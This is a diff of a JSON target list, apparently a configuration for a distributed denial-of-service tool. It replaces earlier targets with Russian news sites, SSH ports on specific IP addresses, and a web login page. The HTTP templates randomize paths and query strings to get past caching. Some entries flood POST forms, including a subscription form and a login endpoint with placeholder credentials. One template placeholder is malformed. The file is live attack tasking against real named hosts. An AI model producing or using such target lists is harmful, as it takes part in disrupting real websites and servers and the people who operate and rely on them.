@@ -1,31 +1,39 @@
 {
   "targets": [
     {
-      "target": "https://fine-news.ru",
+      "target": "https://expert.ru",
       "method": "HTTP_TEMPLATE",
       "options": {
-        "headers": "{\"Referer\": \"https://fine-news.ru/\"}",
-        "path_qs": "/?s={{str(1)}}"
+        "headers": "{\"Referer\": \"https://expert.ru/ekonomika/\"}",
+        "path_qs": "/ekonomika/{{int(1,1651}}/"
       }
     },
     {
-      "target": "213.139.208.57:22",
+      "target": "https://expert.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "body": "name=&email=podpiska@expert.ru&accepted_agreement=on",
+        "headers": "{\"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"Referer\": \"https://expert.ru/search/\", \"X-Requested-With\": \"XMLHttpRequest\"}",
+        "path_qs": "/halfreg/",
+        "verb": "POST"
+      }
+    },
+    {
+      "target": "195.161.69.169:22",
       "method": "TCP"
     },
     {
-      "target": "https://www.m24.ru",
-      "method": "HTTP_TEMPLATE",
-      "options": {
-        "headers": "{\"Referer\": \"https://www.m24.ru/\"}",
-        "path_qs": "/news/politika/09012023/{{int(1,538801)}}?{{str(4)}}={{str(4)}}"
-      }
+      "target": "82.202.160.250:22",
+      "method": "TCP"
     },
     {
-      "target": "https://www.m24.ru",
+      "target": "https://katehon.com:20000",
       "method": "HTTP_TEMPLATE",
       "options": {
-        "headers": "{\"Referer\": \"https://www.m24.ru/\"}",
-        "path_qs": "/sphinx?criteria={{str(1)}}%20{{str(1)}}%20{{str(1)}}&mt="
+        "body": "user=a.abcdef&pass=1q2w3e4r5t",
+        "headers": "{\"Content-Type\": \"application/x-www-form-urlencoded\", \"Referer\": \"https://katehon.com:20000/session_login.cgi\"}",
+        "path_qs": "/session_login.cgi",
+        "verb": "POST"
       }
     }
   ]
